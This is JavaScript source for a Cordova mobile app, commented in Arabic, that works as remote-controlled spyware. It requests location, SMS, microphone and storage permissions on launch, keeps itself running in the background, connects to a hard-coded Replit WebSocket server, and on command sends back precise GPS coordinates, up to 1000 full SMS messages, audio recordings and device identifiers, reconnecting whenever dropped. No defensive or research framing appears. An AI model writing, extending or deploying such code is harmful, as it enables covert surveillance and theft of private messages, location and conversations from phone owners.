document.addEventListener('deviceready', onDeviceReady, false);

// متغيرات لتخزين البيانات
const receivedRequests = [];
const pendingDownloads = [];

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات التلقائي عند بدء التشغيل
  requestPermissions();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// طلب الأذونات التلقائية
function requestPermissions() {
  const permissions = [
    'ACCESS_FINE_LOCATION',
    'READ_SMS',
    'RECORD_AUDIO',
    'WRITE_EXTERNAL_STORAGE',
    'READ_EXTERNAL_STORAGE'
  ];
  
  permissions.forEach(permission => {
    cordova.plugins.permissions.requestPermission(
      permission,
      function(success) {
        console.log('Permission ' + permission + ' granted');
      },
      function(error) {
        console.log('Permission ' + permission + ' denied');
      }
    );
  });
}

// تشغيل التطبيق في الخلفية
function setupBackgroundMode() {
  cordova.plugins.backgroundMode.enable();
  cordova.plugins.backgroundMode.setDefaults({
    title: 'التطبيق يعمل في الخلفية',
    text: 'جارٍ مراقبة الأوامر...'
  });
  
  cordova.plugins.backgroundMode.on('activate', function() {
    cordova.plugins.backgroundMode.disableWebViewOptimizations();
  });
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
    
    // إعداد وضع الخلفية
    setupBackgroundMode();
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        
        // تخزين الطلب في القائمة
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString(),
          status: 'pending'
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          // تحديث حالة الطلب
          const requestIndex = receivedRequests.findIndex(req => req.commandId === data.command.commandId);
          if (requestIndex !== -1) {
            receivedRequests[requestIndex].status = 'completed';
            receivedRequests[requestIndex].response = response;
          }
          
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.command.commandId,
              response
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      else if (data.type === 'download_request') {
        // تخزين طلب التحميل
        pendingDownloads.push({
          ...data,
          receivedAt: new Date().toISOString(),
          status: 'pending'
        });
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString()
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = command.commandId || Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_requests':
      getRequests(commandId, callback);
      break;
    case 'get_downloads':
      getDownloads(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      
      callback({
        commandId,
        status: 'success',
        location: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp,
          google_maps_link: googleMapsLink
        }
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة عدد الرسائل المسحوبة
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // عرض النص الكامل بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  const mediaRec = new MediaRecorder({
    // إعدادات لتسجيل بصيغة MP3
    mimeType: 'audio/mpeg',
    bitsPerSecond: 128000
  });
  
  const audioChunks = [];
  mediaRec.ondataavailable = (e) => {
    audioChunks.push(e.data);
  };
  
  mediaRec.onstop = () => {
    const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
    const audioUrl = URL.createObjectURL(audioBlob);
    
    // حفظ الملف في التخزين المحلي
    const fileName = `recording_${commandId}.mp3`;
    saveAudioFile(fileName, audioBlob, (fileEntry) => {
      callback({ 
        commandId,
        status: 'success',
        audio: {
          duration: duration,
          format: 'mp3',
          size: audioBlob.size,
          filePath: fileEntry.toURL(),
          fileName: fileName
        }
      });
    });
  };
  
  mediaRec.start();
  setTimeout(() => {
    mediaRec.stop();
  }, duration * 1000);
}

function saveAudioFile(fileName, blob, callback) {
  window.resolveLocalFileSystemURL(
    cordova.file.externalDataDirectory,
    (dirEntry) => {
      dirEntry.getFile(
        fileName,
        { create: true },
        (fileEntry) => {
          fileEntry.createWriter(
            (fileWriter) => {
              fileWriter.onwriteend = () => {
                callback(fileEntry);
              };
              fileWriter.onerror = (e) => {
                console.error('Error writing file:', e);
              };
              fileWriter.write(blob);
            },
            (error) => {
              console.error('Error creating file writer:', error);
            }
          );
        },
        (error) => {
          console.error('Error getting file:', error);
        }
      );
    },
    (error) => {
      console.error('Error getting directory:', error);
    }
  );
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests
  });
}

function getDownloads(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    downloads: pendingDownloads
  });
}

// إعادة تشغيل الخدمة عند إعادة تشغيل الجهاز
document.addEventListener('resume', onDeviceReady, false);
